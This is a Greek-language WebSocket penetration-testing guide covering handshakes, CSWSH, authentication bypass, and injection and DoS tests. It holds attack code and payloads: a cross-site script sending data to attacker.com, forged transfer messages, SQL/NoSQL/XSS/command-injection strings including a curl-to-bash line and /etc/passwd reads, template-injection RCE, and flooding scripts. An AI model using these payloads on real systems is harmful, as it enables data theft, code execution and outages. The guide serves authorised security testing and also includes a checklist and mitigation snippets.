# 🔌 Οδηγός ελέγχων WebSocket

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../WebSocket-Attacks.md) • [🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

## Πριν ξεκινήσετε

Το **WebSocket** διατηρεί σύνδεση διπλής κατεύθυνσης μεταξύ client και server. Η αρχική **handshake** είναι η διαπραγμάτευση μετάβασης από HTTP. Το ws:// δεν έχει κρυπτογράφηση μεταφοράς, ενώ το wss:// χρησιμοποιεί TLS.

Οι έλεγχοι αφορούν ταυτοποίηση, εξουσιοδότηση κάθε ενέργειας και επικύρωση μηνυμάτων. **CSWSH** είναι κατάχρηση σύνδεσης από άλλη ιστοσελίδα με το πλαίσιο πρόσβασης του χρήστη. Το ότι ο server δέχεται σύνδεση δεν σημαίνει ότι επιτρέπει ευαίσθητες ενέργειες. Τα δείγματα φόρτου και αλλοίωσης δεδομένων χρειάζονται ξεχωριστά εγκεκριμένο εργαστηριακό σενάριο.

<a id="section-01"></a>

## 🔍 Βασικές έννοιες WebSocket

### Αίτημα αρχικής διαπραγμάτευσης
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Απόκριση αρχικής διαπραγμάτευσης
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Ανίχνευση
```
- ws:// χωρίς κρυπτογράφηση
- wss:// με κρυπτογράφηση TLS
- Κεφαλίδα Upgrade: websocket
- Η καρτέλα Network εμφανίζει "101 Switching Protocols"
```

---

<a id="section-02"></a>

## 🎯 Αδυναμίες ασφάλειας WebSocket

### 1. Κατάχρηση WebSocket από άλλη ιστοσελίδα — CSWSH

> **Δεν αρκεί μόνο το Origin:** Χρειάζεται ο browser να μπορεί να συνδέσει το σχετικό πλαίσιο ταυτότητας και η σύνδεση να επιτρέπει ενέργεια ή ανάγνωση που δεν πρέπει. Πολιτικές cookies και η εξουσιοδότηση ανά μήνυμα επηρεάζουν το αποτέλεσμα.


**Προϋπόθεση που εξετάζεται:** Απουσία κατάλληλου ελέγχου Origin στον server· για πραγματικό CSWSH χρειάζονται και οι υπόλοιπες προϋποθέσεις ταυτοποίησης και πρόσβασης.

```html
<!-- Σελίδα δοκιμής του ελεγκτή -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Η σύνδεση άνοιξε και επιτρέπεται αποστολή μηνυμάτων
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Παράδειγμα αποστολής ληφθέντων δεδομένων σε εξωτερικό προορισμό
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Ενέργεια τύπου CSRF:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Εκτέλεση ενέργειας με το πλαίσιο ταυτότητας του χρήστη
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Απουσία ελέγχου κεφαλίδας Origin

**Δοκιμή:**
```bash
# Χρήση wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Χρήση websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Εκμετάλλευση ευπαθειών:**
```javascript
// Αν ο server δέχεται οποιοδήποτε Origin
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Παράκαμψη ταυτοποίησης

**Σύνδεση WebSocket χωρίς έλεγχο ταυτότητας:**
```javascript
// Σύνδεση χωρίς cookies ή tokens
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // Απαιτείται ταυτοποίηση;
};
```

**Token στο URL και κίνδυνος διαρροής:**
```
wss://target.com/ws?token=SECRET_TOKEN
// Το token μπορεί να καταγραφεί· ελέγξτε πραγματική διαρροή ανά περιβάλλον
```

**Δοκιμές διαφορετικών καταστάσεων ταυτοποίησης:**
```javascript
// Δοκιμή ληγμένου token
// Δοκιμή τροποποιημένου token
// Δοκιμή χωρίς token
// Δοκιμή token άλλου δοκιμαστικού λογαριασμού
```

---

### 4. Εισαγωγή μη έμπιστων δεδομένων μέσω WebSocket

**XSS μέσω WebSocket:**
```javascript
// Αποστολή δοκιμαστικής εισόδου XSS
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**Έγχυση SQL (SQL Injection):**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Εισαγωγή εντολών λειτουργικού συστήματος:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**Εισαγωγή σε ερωτήματα NoSQL:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. Παραδείγματα άρνησης υπηρεσίας — DoS

> **Ερμηνεία φόρτου:** Τα δείγματα δεν είναι ελάχιστη απόδειξη άλλων αδυναμιών. Το Python παράδειγμα περιλαμβάνει ενεργό ατέρμονο βρόχο που καταναλώνει και πόρους του client. Χρειάζεται ελεγχόμενο εργαστήριο και συμφωνημένα όρια.


**Υπερβολικός αριθμός μηνυμάτων:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Μεγάλα μηνύματα
  }, 1);
};
```

**Εξάντληση συνδέσεων:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Διατήρηση ανοικτής σύνδεσης

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Αλλοίωση δεδομένων

**Τροποποίηση μηνυμάτων:**
```javascript
// Παρεμβολή και τροποποίηση μηνυμάτων
// Χρήση παρεμβολής WebSocket του Burp Suite

// Αρχικό
{"action": "transfer", "amount": 10, "to": "user123"}

// Τροποποιημένο
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Προβλήματα ταυτόχρονων ενεργειών — race conditions:**
```javascript
// Αποστολή πολλών γρήγορων αιτημάτων
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

<a id="section-03"></a>

## 🛠️ Εργαλεία ελέγχου

### Burp Suite
```
1. Proxy → WebSockets history — ιστορικό μηνυμάτων
2. Δεξί κλικ → Send to Repeater
3. Τροποποιήστε και στείλτε ξανά μηνύματα
4. Ελέγξτε την επιλογή "Auto-scroll to end"
```

### wscat (CLI)
```bash
# Παράδειγμα εγκατάστασης
npm install -g wscat

# Σύνδεση
wscat -c wss://target.com/ws

# Με κεφαλίδες
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Με Origin
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Παράδειγμα εγκατάστασης
cargo install websocat

# Σύνδεση
websocat wss://target.com/ws

# Με κεφαλίδες
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Παράδειγμα ελέγχου σε Python
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Δοκιμαστικές είσοδοι
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Εργαλεία προγραμματιστή του browser
```javascript
// Παρακολούθηση κίνησης WebSocket
// F12 → Network → φίλτρο WS

// Χειροκίνητη δοκιμή
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

<a id="section-04"></a>

## 💉 Συλλογή δοκιμαστικών εισόδων

### Έλεγχος ταυτοποίησης
```json
// Χωρίς στοιχεία ταυτοποίησης
{"action": "get_secret_data"}

// Κενό token
{"token": "", "action": "admin_action"}

// Token με τιμή null
{"token": null, "action": "delete_user"}
```

### Παραδείγματα δοκιμαστικών δεδομένων XSS
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### Δοκιμαστικές είσοδοι SQLi
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Εισαγωγή εντολών λειτουργικού συστήματος
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Μετακίνηση εκτός προβλεπόμενου καταλόγου
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

<a id="section-05"></a>

## 📋 Λίστα ελέγχου

```markdown
## Λίστα ελέγχου ασφάλειας WebSocket

□ Αναγνώριση σημείων σύνδεσης WebSocket
□ Έλεγχος επικύρωσης της κεφαλίδας Origin
□ Έλεγχος CSWSH — χρήσης σύνδεσης από άλλη ιστοσελίδα
□ Έλεγχος απαιτήσεων ταυτοποίησης
□ Έλεγχος ασφαλούς μεταφοράς tokens
□ Έλεγχος εισαγωγής μη έμπιστων δεδομένων: XSS, SQLi κ.ά.
□ Έλεγχος εξουσιοδότησης με δικούς σας δοκιμαστικούς λογαριασμούς
□ Έλεγχος ορίων ρυθμού
□ Έλεγχος ορίων μεγέθους μηνυμάτων
□ Έλεγχος έκθεσης ευαίσθητων δεδομένων
□ Έλεγχος χειρισμού σύνδεσης και επανασύνδεσης
□ Έλεγχος κρυπτογράφησης: wss:// έναντι ws://
```

---

<a id="section-06"></a>

## 🔐 Ενδεικτική υλοποίηση ελέγχων ασφάλειας

> **Ενδεικτικά αποσπάσματα:** Δεν αποτελούν πλήρη ασφαλή server. Τα αντικείμενα και τα events εξαρτώνται από βιβλιοθήκη. Χρειάζεται αξιόπιστη ανάλυση token, διακοπή μετά την αποτυχία, χειρισμός μη έγκυρου JSON και εξουσιοδότηση κάθε ενέργειας.


```javascript
// Έλεγχος Origin στην πλευρά του server
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Ταυτοποίηση με token
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Έλεγχος εγκυρότητας εισόδου
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

<a id="section-07"></a>

## 🔗 Σχετικές συλλογές δοκιμαστικών εισόδων

- [Παραδείγματα δοκιμαστικών δεδομένων XSS](XSS.el.md)
- [Δοκιμαστικές είσοδοι SQLi](SQLi.el.md)
- [Εισαγωγή εντολών λειτουργικού συστήματος](Command-Injection.el.md)

---

**Επιστροφή στη συλλογή:** [💉 Συλλογή δοκιμαστικών εισόδων στην ελληνική αρχική σελίδα](../../README.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
